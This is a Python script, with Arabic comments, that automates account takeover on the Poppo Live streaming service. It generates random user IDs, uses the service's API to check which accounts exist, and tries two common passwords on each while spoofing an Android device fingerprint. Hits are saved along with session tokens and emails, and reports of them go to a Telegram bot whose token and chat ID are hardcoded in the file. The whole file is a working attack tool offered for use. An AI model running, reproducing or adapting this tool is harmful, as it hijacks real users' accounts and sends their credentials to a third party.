#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Poppo Live - Auto Hunter + Checker + Telegram Reporter
"""
import os, sys, json, time, random, threading, io
import requests, urllib3, warnings
from datetime import datetime
from queue import Queue
from collections import deque
from colorama import Fore, Style, init
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ═══════════════════════════════════════════════════════════════
# ⚙️ الإعدادات الثابتة
# ═══════════════════════════════════════════════════════════════
THREADS         = 20
TARGET_COUNT    = 1_000_000_000     # عملياً غير محدود
ID_MIN          = 10_000_000
ID_MAX          = 99_999_999
REQUEST_TIMEOUT = 20
MAX_RETRIES     = 2
REPORT_INTERVAL = 600               # 10 دقائق

PASSWORDS = ["Aa123456", "Aa123456789"]

# 🆕 البصمة
DEVICE = {
    "smei_id":     "BBwEAY8YRFs04yeeIrPSprq/BLNjA8h3FLJUfkBGrYJgaNXhnUitq++B41rYnAS3fbOOdMnT6n6KUCCXp6noXcg==",
    "yidun_id":    "FzZxOxNTF1lTok0lVJs2wXK+JAuSe4RR8Yz7U++kZUZH34d6ZMPSnoKCtIUmD5gzCegGvg==",
    "uuid":        "2c90bd96a205f6c9",
    "device_name": "samsung SM-A155F",
    "user_agent":  "Dalvik/2.1.0 (Linux; U; Android 14; SM-A155F Build/UP1A.231005.007)",
    "c": "poppo", "v": "550", "vs": "5.4.550.0917",
    "sl": "en", "l": "en", "mcc": "60301", "p": "android",
    "x_request_agent": "0ffffffdb0ffffff843f0fffffff17a0ffffffb07b140e1d11300ffffffcb0ffffff800f14",
    "install_time": "2026-11-05 10:00:00.000",
}

# 🆕 تيليجرام
TG_TOKEN   = "8947371808:AAH7k_kTGFMfbRU_pqhiqgI8lCr6gBERQNg"
TG_CHAT_ID = "7236237385"

# ═══════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.checked = 0
        self.exists = 0
        self.not_exists = 0
        self.login_tried = 0
        self.hits = 0
        self.bad_login = 0
        self.errors = 0
        self.start_time = time.time()
        self._lock = threading.Lock()
    def inc(self, name, n=1):
        with self._lock:
            setattr(self, name, getattr(self, name) + n)
    def snapshot(self):
        with self._lock:
            return {
                "checked":     self.checked,
                "exists":      self.exists,
                "not_exists":  self.not_exists,
                "login_tried": self.login_tried,
                "hits":        self.hits,
                "bad_login":   self.bad_login,
                "errors":      self.errors,
                "elapsed":     int(time.time() - self.start_time),
            }
    def cpm(self):
        e = time.time() - self.start_time
        return int((self.checked / e) * 60) if e > 0 else 0

stats = Stats()
lock = threading.Lock()
inflight = {}
recent = deque(maxlen=20)

new_hits_buffer = []
new_hits_lock = threading.Lock()

def create_results_folder():
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    f = f"results/poppo_{ts}"
    os.makedirs(f, exist_ok=True)
    return f

RESULTS_FOLDER = create_results_folder()

def save_line(fn, content):
    try:
        with open(os.path.join(RESULTS_FOLDER, fn), "a", encoding="utf-8") as f:
            f.write(content + "\n")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# 📱 تيليجرام
# ═══════════════════════════════════════════════════════════════
def tg_send(text):
    """يرسل رسالة إلى تيليجرام."""
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = {
            "chat_id": TG_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        r = requests.post(url, json=payload, timeout=15)
        if r.status_code != 200:
            print(f"[TG] Failed: {r.status_code} - {r.text[:120]}")
    except Exception as e:
        print(f"[TG] Exception: {e}")

def reporter_thread():
    """كل 10 دقائق يرسل تقرير + الصيد الجديد."""
    while True:
        time.sleep(REPORT_INTERVAL)
        snap = stats.snapshot()

        # سحب الصيد الجديد من الـ buffer
        with new_hits_lock:
            batch = list(new_hits_buffer)
            new_hits_buffer.clear()

        # إحصائيات
        h = snap["elapsed"] // 3600
        m = (snap["elapsed"] % 3600) // 60
        s = snap["elapsed"] % 60

        report = (
            f"📊 <b>Poppo Hunter Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱ Time: {h}h {m}m {s}s\n"
            f"🔍 Checked: <b>{snap['checked']:,}</b>\n"
            f"✅ IDs Found: <b>{snap['exists']:,}</b>\n"
            f"❌ Not Found: {snap['not_exists']:,}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Login Tried: {snap['login_tried']:,}\n"
            f"🎯 <b>HITS: {snap['hits']:,}</b>\n"
            f"🚫 Bad Password: {snap['bad_login']:,}\n"
            f"⚠️ Errors: {snap['errors']:,}\n"
            f"⚡ CPM: {stats.cpm():,}\n"
        )

        # لو فيه صيد جديد نضيفه (أول 10 فقط لتفادي رسائل طويلة)
        if batch:
            report += f"\n━━━━━━━━━━━━━━━━━━━━\n🆕 <b>New Hits ({len(batch)}):</b>\n"
            for hit in batch[:10]:
                report += f"• <code>{hit['userid']}:{hit['password']}</code> — {hit.get('nickname','')}\n"
            if len(batch) > 10:
                report += f"... and {len(batch) - 10} more\n"

        tg_send(report)

# ═══════════════════════════════════════════════════════════════
# 🔍 فحص الـ ID
# ═══════════════════════════════════════════════════════════════
def check_userid(session, userid):
    url = "https://api.vshowapi.com/user/check-userid"
    params = {
        "userid":      str(userid),
        "p":           DEVICE["p"],
        "smei_id":     DEVICE["smei_id"],
        "device_name": DEVICE["device_name"],
        "c":           DEVICE["c"],
        "v":           DEVICE["v"],
        "yidun_id":    DEVICE["yidun_id"],
        "sl":          DEVICE["sl"],
        "l":           DEVICE["l"],
        "mcc":         DEVICE["mcc"],
        "vs":          DEVICE["vs"],
        "uuid":        DEVICE["uuid"],
        "_mtime":      str(int(time.time() * 1000)),
    }
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent":   DEVICE["user_agent"],
        "Accept-Encoding": "gzip",
    }
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get(url, params=params, headers=headers,
                            timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 429:
                time.sleep(2); continue
            data = r.json()
            if data.get("status") != "ok":
                return None, {}
            d = data.get("data", {})
            exists = str(d.get("exists", "0")) == "1"
            return exists, d
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return None, {}
            time.sleep(0.5)
    return None, {}

# ═══════════════════════════════════════════════════════════════
# 🔑 تسجيل الدخول
# ═══════════════════════════════════════════════════════════════
def try_login(session, userid, password):
    url = "https://api.vshowapi.com/user/login"
    params = {
        "login_type":  "password",
        "password":    password,
        "inland":      "0",
        "type":        "userid",
        "userid":      str(userid),
        "p":           DEVICE["p"],
        "smei_id":     DEVICE["smei_id"],
        "device_name": DEVICE["device_name"],
        "c":           DEVICE["c"],
        "v":           DEVICE["v"],
        "yidun_id":    DEVICE["yidun_id"],
        "sl":          DEVICE["sl"],
        "l":           DEVICE["l"],
        "mcc":         DEVICE["mcc"],
        "vs":          DEVICE["vs"],
        "uuid":        DEVICE["uuid"],
    }
    body = {
        "login_type":   "password",
        "password":     password,
        "inland":       "0",
        "type":         "userid",
        "userid":       str(userid),
        "install_data": json.dumps({
            "install_time": DEVICE["install_time"],
            "af_message": "organic install",
            "af_status": "Organic",
            "is_first_launch": False,
        }, separators=(",", ":")),
        "p":            DEVICE["p"],
        "smei_id":      DEVICE["smei_id"],
        "device_name":  DEVICE["device_name"],
        "c":            DEVICE["c"],
        "v":            DEVICE["v"],
        "yidun_id":     DEVICE["yidun_id"],
        "sl":           DEVICE["sl"],
        "l":            DEVICE["l"],
        "mcc":          DEVICE["mcc"],
        "vs":           DEVICE["vs"],
        "uuid":         DEVICE["uuid"],
    }
    headers = {
        "X-Request-Agent":     DEVICE["x_request_agent"],
        "X-Request-Device-Id": DEVICE["smei_id"],
        "x-device-info": json.dumps({
            "smei_id": DEVICE["smei_id"], "android_id": DEVICE["uuid"],
            "oaid": "", "device_name": DEVICE["device_name"], "imei": "",
        }, separators=(",", ":")),
        "X-Request-Time":   str(int(time.time())),
        "User-Agent":       DEVICE["user_agent"],
        "Content-Type":     "application/x-www-form-urlencoded",
        "Accept-Encoding":  "gzip",
    }
    for attempt in range(MAX_RETRIES):
        try:
            r = session.post(url, params=params, data=body, headers=headers,
                             timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
            if r.status_code == 429:
                time.sleep(2); continue
            data = r.json()
            if (data.get("status") or "").lower() == "ok" and data.get("token"):
                return "hit", data
            return "bad", data
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return "error", {}
            time.sleep(0.5)
    return "error", {}

# ═══════════════════════════════════════════════════════════════
# 🎯 معالجة ID واحد
# ═══════════════════════════════════════════════════════════════
def process_id(userid):
    with lock:
        inflight[userid] = time.time()

    result = {
        "userid":   userid,
        "exists":   None,
        "email":    "",
        "has_pwd":  "0",
        "login":    "skipped",
        "nickname": "",
    }

    try:
        session = requests.Session()
        session.verify = False
        session.trust_env = False
        session.headers.update({"User-Agent": DEVICE["user_agent"]})

        exists, data = check_userid(session, userid)
        result["exists"] = exists

        if exists is None:
            result["login"] = "error"
            stats.inc("errors")
        elif not exists:
            stats.inc("not_exists")
        else:
            stats.inc("exists")
            result["email"]   = data.get("email", "") or ""
            result["has_pwd"] = str(data.get("has_passwd", "0"))

            bind_types = ", ".join(b.get("type", "?") for b in (data.get("bind_accounts") or []))
            save_line("Found_IDs.txt",
                      f"{userid}\t{result['email']}\tpwd={result['has_pwd']}\tbind=[{bind_types}]")

            # محاولة الباسوردين
            if result["has_pwd"] == "1":
                for pwd in PASSWORDS:
                    stats.inc("login_tried")
                    status, login_data = try_login(session, userid, pwd)

                    if status == "hit":
                        stats.inc("hits")
                        result["login"]    = "hit"
                        result["nickname"] = login_data.get("nickname", "")

                        save_line("Hits.txt", f"{userid}:{pwd}")
                        save_line("Hits_Details.txt", json.dumps({
                            "userid":     userid,
                            "password":   pwd,
                            "uid":        login_data.get("uid"),
                            "nickname":   result["nickname"],
                            "email":      login_data.get("email"),
                            "province":   login_data.get("province"),
                            "token":      login_data.get("token"),
                            "public_key": login_data.get("public_key"),
                            "avatar":     login_data.get("avatar"),
                            "timestamp":  login_data.get("timestamp"),
                        }, ensure_ascii=False))

                        # إضافة للـ buffer للتقارير
                        with new_hits_lock:
                            new_hits_buffer.append({
                                "userid":   userid,
                                "password": pwd,
                                "nickname": result["nickname"],
                            })
                        break  # كفى، لقينا باسورد صحيح

                    elif status == "bad":
                        stats.inc("bad_login")
                        result["login"] = "bad"
                    else:
                        stats.inc("errors")
                        result["login"] = "error"
            else:
                result["login"] = "no_pwd"

    except Exception:
        stats.inc("errors")
        result["login"] = "error"
    finally:
        with lock:
            inflight.pop(userid, None)
            recent.append(result)
            stats.inc("checked")

# ═══════════════════════════════════════════════════════════════
# 🎲 مولّد الـ IDs
# ═══════════════════════════════════════════════════════════════
def id_generator(queue, target_count, stop_event, done_event):
    seen = set()
    generated = 0
    while generated < target_count and not stop_event.is_set():
        uid = random.randint(ID_MIN, ID_MAX)
        if uid in seen:
            continue
        seen.add(uid)
        generated += 1
        queue.put(uid)
    done_event.set()

def worker(queue, stop_event, done_event):
    while not stop_event.is_set():
        try:
            uid = queue.get(timeout=0.5)
        except Exception:
            if done_event.is_set() and queue.empty():
                break
            continue
        try:
            process_id(uid)
        finally:
            queue.task_done()

# ═══════════════════════════════════════════════════════════════
# 🖥️ العرض
# ═══════════════════════════════════════════════════════════════
def build_render():
    layout = Layout()

    t_res = Table(box=box.SIMPLE, show_header=False, expand=True, padding=(0, 1))
    with lock:
        snap = list(recent)
    tail = snap[-12:]
    for r in tail:
        line = Text()
        if r["login"] == "hit":
            line.append("  ✅ HIT     ", style="bold green")
            line.append(f"{r['userid']}", style="bold green")
            if r["nickname"]:
                line.append(f"   {r['nickname']}", style="green")
        elif r["login"] == "bad":
            line.append("  ✗ BAD_PWD  ", style="yellow")
            line.append(f"{r['userid']}", style="yellow")
        elif r["login"] == "no_pwd":
            line.append("  ○ NO_PWD   ", style="cyan")
            line.append(f"{r['userid']}", style="cyan")
        elif r["login"] == "error":
            line.append("  ! ERROR    ", style="magenta")
            line.append(f"{r['userid']}", style="magenta")
        elif r["exists"] is False:
            line.append("  · NONE     ", style="dim")
            line.append(f"{r['userid']}", style="dim")
        else:
            line.append("  ? UNKNOWN  ", style="dim")
            line.append(f"{r['userid']}", style="dim")
        t_res.add_row(line)
    for _ in range(12 - len(tail)):
        t_res.add_row(Text(""))

    with lock:
        n_inf = len(inflight)
    t_inf = Text()
    t_inf.append("In-Flight: ", style="cyan")
    t_inf.append(str(n_inf), style="bold yellow" if n_inf else "dim")

    s = stats.snapshot()
    t_stat = Text()
    t_stat.append("Checked ", style="cyan")
    t_stat.append(f"{s['checked']:,}", style="bold white")
    t_stat.append("   IDs ", style="cyan"); t_stat.append(str(s["exists"]), style="bold cyan")
    t_stat.append("   Logins ", style="cyan"); t_stat.append(str(s["login_tried"]), style="bold yellow")
    t_stat.append("   HITS ", style="cyan"); t_stat.append(str(s["hits"]), style="bold green")
    t_stat.append("   BadPwd ", style="cyan"); t_stat.append(str(s["bad_login"]), style="red")
    t_stat.append("   Err ", style="cyan"); t_stat.append(str(s["errors"]), style="magenta")
    t_stat.append("   CPM ", style="cyan"); t_stat.append(str(stats.cpm()), style="bold cyan")

    layout.split_column(
        Layout(Panel(Text(
            f"Poppo Hunter — Auto (20 Threads)\n"
            f"Passwords: {', '.join(PASSWORDS)}\n"
            f"Reports every 10 min to Telegram",
            style="bold cyan"), border_style="cyan"), size=5),
        Layout(t_res, name="results"),
        Layout(t_inf, size=1),
        Layout(Panel(t_stat, border_style="green", padding=(0, 1)), size=3),
    )
    return layout

# ═══════════════════════════════════════════════════════════════
# 🏠 Main
# ═══════════════════════════════════════════════════════════════
def main():
    print(f"{Fore.CYAN}════════════════════════════════════════{Style.RESET_ALL}")
    print(f"{Fore.GREEN}   Poppo Live - Auto Hunter (No Config){Style.RESET_ALL}")
    print(f"{Fore.CYAN}════════════════════════════════════════{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Threads       : {Fore.WHITE}{THREADS}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Target        : {Fore.WHITE}{TARGET_COUNT:,} IDs (unlimited){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Passwords     : {Fore.WHITE}{', '.join(PASSWORDS)}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Report every  : {Fore.WHITE}10 minutes{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Telegram Chat : {Fore.WHITE}{TG_CHAT_ID}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}   Results → {RESULTS_FOLDER}{Style.RESET_ALL}\n")

    # إرسال رسالة بدء
    tg_send(
        f"🚀 <b>Poppo Hunter Started</b>\n"
        f"Threads: {THREADS}\n"
        f"Passwords: {', '.join(PASSWORDS)}\n"
        f"Reports every 10 minutes."
    )

    input(f"{Fore.GREEN}Press ENTER to launch...{Style.RESET_ALL}")

    # بدء مُرسل التقارير
    threading.Thread(target=reporter_thread, daemon=True).start()

    queue = Queue(maxsize=THREADS * 8)
    stop_event = threading.Event()
    done_event = threading.Event()

    threading.Thread(
        target=id_generator,
        args=(queue, TARGET_COUNT, stop_event, done_event),
        daemon=True,
    ).start()

    for _ in range(THREADS):
        threading.Thread(
            target=worker,
            args=(queue, stop_event, done_event),
            daemon=True,
        ).start()

    console = Console()
    try:
        with Live(build_render(), console=console,
                  refresh_per_second=10, screen=True, transient=False) as live:
            while True:
                live.update(build_render())
                time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()

    s = stats.snapshot()
    console.print()
    console.print(f"[bold cyan]Done. Saved to: {RESULTS_FOLDER}[/bold cyan]")
    console.print(
        f"[green]Checked: {s['checked']:,} | "
        f"IDs: {s['exists']:,} | "
        f"Logins: {s['login_tried']:,} | "
        f"HITS: {s['hits']:,} | "
        f"BadPwd: {s['bad_login']:,} | "
        f"Err: {s['errors']:,}[/green]"
    )

if __name__ == "__main__":
    main()